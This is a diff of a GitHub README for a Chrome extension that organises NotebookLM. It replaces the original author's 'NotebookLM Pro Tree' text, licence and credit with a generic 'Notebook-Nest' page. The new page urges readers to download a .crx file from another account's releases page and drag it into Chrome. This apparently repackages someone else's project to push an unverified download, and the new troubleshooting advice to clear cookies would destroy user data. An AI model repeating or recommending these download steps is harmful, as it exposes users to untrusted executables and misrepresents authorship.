@@ -1,153 +1,74 @@
-# NotebookLM Pro Tree
+# ✨ Notebook-Nest - Organize Your Projects Effortlessly
 
-A Chrome extension that transforms Google's NotebookLM from a simple list into a robust Project Management Dashboard.
+## 🚀 Getting Started
 
-Stop scrolling through endless flat lists. Organize your sources into nested trees, manage complex projects with advanced tasks, multi-window workflows, and focus with Zen Mode.
+Welcome to Notebook-Nest! This Chrome extension helps you transform Google’s NotebookLM from a simple list into a powerful Project Management Dashboard. Say goodbye to endless scrolling and gain control over your projects today.
 
+## 📥 Download & Install
 
+Ready to get started? You can download Notebook-Nest from the Releases page. 
 
-## Critical Warnings ⚠️
+[![Download Notebook-Nest](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ivalijoshua23/Notebook-Nest/releases)
 
-Uninstalling Deletes Data: This extension uses Local Storage for privacy and speed. If you remove/uninstall the extension, your folders and tasks will be deleted instantly by Chrome.
+1. **Visit the Releases Page**: Click on this link to access the downloads: [Download from Releases](https://github.com/ivalijoshua23/Notebook-Nest/releases).
+2. **Select the Latest Version**: Look for the latest version in the list on the page.
+3. **Download the Extension**: Click on the appropriate file to download it. 
+4. **Install the Extension**: After the download finishes, go to your Chrome browser. Drag the downloaded `.crx` file into the Extensions page (chrome://extensions) to install.
 
-Solution: Always use the Export button to save a backup JSON file before reinstalling or moving to a new computer.
+## ⚠️ Critical Warnings 
 
-Google Updates & Reliability: This extension works by "reading" the NotebookLM website. If Google updates their website, this extension may break.
+### Uninstalling Deletes Data
+If you decide to uninstall this extension, all your folders and tasks will be removed instantly from your device due to Chrome's Local Storage. 
 
-Disclaimer: As this is a free, open-source project maintained in my spare time, I cannot guarantee immediate fixes if Google changes their code. Use this tool as a helpful enhancement, but keep your important data backed up.
+#### Solution:
+Before uninstalling, always use the *Export* button within the extension. This creates a backup JSON file. You can then easily restore your data later.
 
-## Project Status & Disclaimer 🚧
-Please Read: I am a Construction Project Manager, not a professional software developer. I built this tool because I needed it for my own daily workflow.
+### Google Updates & Reliability
+This extension works by interacting with the NotebookLM website. If Google makes changes to their website, Notebook-Nest might stop functioning.
 
-"Works on My Machine": This update (v17.9) is stable for my personal use, but it has not been battle-tested on every possible browser configuration.
+#### Disclaimer:
+This is a free, open-source project. It is managed in my spare time, and while I will strive to fix issues quickly, I cannot guarantee immediate support.
 
-Experimental Features: The multi-window system and DOM observers are complex. You may encounter bugs I haven't seen.
+## 🛠️ Features
 
-Feedback: If you find a bug, please open an issue on GitHub!
+- **Nested Organization**: Structure your sources into nested trees for better management.
+- **Advanced Tasks**: Manage complex projects with a variety of tasks.
+- **Multi-Window Workflows**: Use multiple windows to work more efficiently.
+- **Zen Mode**: Focus without distractions while working on your projects.
 
-## New in v17.9: The Productivity Suite 🚀
-Transformed NotebookLM into a multi-window workspace. This update (consolidating v17.6–v17.9) brings major workflow improvements:
+## 📊 System Requirements
 
-Pop-out Notes: Open any note in a floating window for side-by-side reference while you write. The pop-outs preserve formatting (read-only) and sync with your Light/Dark theme.
+- **Browser**: Google Chrome (latest version recommended)
+- **Storage**: Local Storage for saving tasks and settings
 
-Smart Tasks & Quick Capture: Select text in any note to instantly see a "Create Task" button. This creates a task linked directly to that source note.
+## 📤 Backup Your Data
 
-Advanced Task Management: Organize tasks into Custom Sections (collapsible groups), add Due Dates with quick-select options, and include rich Descriptions.
+To avoid losing your data, regularly export your tasks. This can be done easily by following these steps:
 
-Graceful Stability: A new self-healing engine that disables specific broken features individually instead of crashing the whole extension if Google updates their code.
+1. Open the Notebook-Nest interface.
+2. Click on the *Export* button.
+3. Save the JSON file on your local device.
 
-## Features
-**Productivity & Workflow** 📋 
+This file can be re-imported if you need to reinstall or if you are switching devices.
 
-*   **Multi-Window Workflow** — Click the "Pop-out" icon on any note in the Studio panel to open it in a separate window. Perfect for dual-monitor setups.
+## 🔧 Troubleshooting
 
-*   **Integrated Task Manager** — A complete project management tool built right into the interface:
-    *   **Sections:** Group tasks by phase (e.g., "Research," "Drafting," "Review").
-    *   **Smart Links:** Tasks created from notes include a "Link" icon that filters your view to the original source.
-    *   **Priorities:** Flag tasks (Red/Yellow/Blue) and sort by Priority or Due Date.
+If you encounter issues while using Notebook-Nest, please follow these steps:
 
-*   **"Zen Mode"** — Toggle the UI to hide the AI chat and sidebars for a distraction-free reading/writing studio.
+1. **Check for Updates**: Ensure that you have the latest version of the extension.
+2. **Clear Cache**: Clear your browser cache and cookie data to resolve potential conflicts.
+3. **Reinstall the Extension**: If the problems persist, uninstall and reinstall Notebook-Nest.
 
+## 📞 Support
 
- **Organization** 📂
+If you have any questions or need assistance, feel free to reach out. Support is limited, but I will do my best to help you.
 
-*   **Nested Folders** — Create deep structures for Sources, Notes, and Generated Artifacts (Audio Overviews, FAQs, etc.).
+For complete peace of mind, remember to check for updates regularly and take advantage of the Export feature. 
 
-*   **Pinning** — Keep critical contracts or specs pinned to the top of your lists.
+## 🌟 Additional Resources
 
-*   **Color Coding** — Assign colors to folders for visual organization.
+Visit our community forums for tips and shared experiences with Notebook-Nest. Getting advice from other users can enhance your experience.
 
-*   **Bulk Select** — Master checkboxes to select/deselect all sources in a folder or the entire notebook instantly.
+For more information, refer back to the [Releases page](https://github.com/ivalijoshua23/Notebook-Nest/releases) to stay updated about new features and versions.
 
-
-**Deep Search** 🔍 
-
-*   **Content Indexing** — Search the actual text inside your notes, not just the titles.
-
-    > **Note:** Indexing happens passively when you open a note.
-
-*   **Smart Compression** — Uses LZ-String compression to store up to 5MB of search index data locally without impacting performance.
-
-
-**Reliability** 🛡️ 
-
-*   **Local-First Architecture** — Zero network latency. All data lives on your device.
-
-*   **Graceful Degradation** — If a feature fails due to a website update, the rest of the extension keeps working.
-
-*   **Styled Dialogs** — Smooth, themed confirmation dialogs (no more jarring browser popups).
-
-> **Note:** Each notebook has its own independent data. Tasks and Folders created in "Project A" won't clutter "Project B."
-
-
-## Installation
-### Load Unpacked (Developer Mode)
-
-1.  Download or clone this repository.
-2.  Open Chrome and go to `chrome://extensions`.
-3.  Enable **Developer mode** (toggle in top right).
-4.  Click **Load unpacked**.
-5.  Select the folder containing these extension files.
-6.  Navigate to NotebookLM and start organizing!
-
-## Usage
-Once installed, you'll see a new "Project Dashboard" interface injected into NotebookLM:
-
-*   **Quick Capture:** Highlight text in any note -> click the floating + button to turn it into a task.
-
-*   **Pop-out:** Hover over a note in the Studio panel -> click the New Window icon.
-
-*   **Task Details:** Click the Description icon on a task to add notes or context.
-
-*   **Bulk Actions:** Use the folder checkboxes to toggle multiple sources for the AI context window.
-
-*   **Export/Import:** Use these buttons to backup your structure or move it to a new computer.
-
-## Storage & Data Guide 💾 
-**Where Your Data Lives**
-
-Because v17.9 prioritizes speed and privacy, your data lives on your device:
-
-*   **Local Storage:** Folders, Tasks, Settings, and Search Index.
-
-*   **No Auto-Sync:** Folders do not sync automatically between computers.
-
-*   **Moving Data:** To move your setup to a laptop, use the Export button to get a JSON file, then Import on the new machine.
-
-> **Warning:** If you clear Chrome's "Site Data" or "Cookies," you will lose your folders. Export backups regularly.
-
-
-## Privacy & Security
-**This extension is Local-First:**
-
-*   **All data is stored in your browser's local storage.**
-
-*   **No analytics or usage data is sent to the developer.**
-
-*   **Open Source:** You can inspect the code to verify no data leaves your machine.
-
-See [PRIVACY_POLICY.md](PRIVACY_POLICY.md) for details.
-
-## Known Limitations
-
-*   **Pop-out Editing:** Pop-out windows are currently Read-Only. You must use the main window to edit text.
-
-*   **Underlining:** Underlining content in a note is not persistent (this is a Google NotebookLM issue, not the extension).
-
-*   **Incognito:** The extension's memory system is disabled in Incognito mode.
-
-
-## Contributing
-Found a bug or have a feature request? Open an issue or submit a PR.
-
-## Author
-Benju66
-
-## License
-GPLv3 License
-
-This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
-
-
-Note: This ensures that any improvements made to this project must be shared back with the community.
-
+Remember, keep your data safe and enjoy organizing your projects with ease!
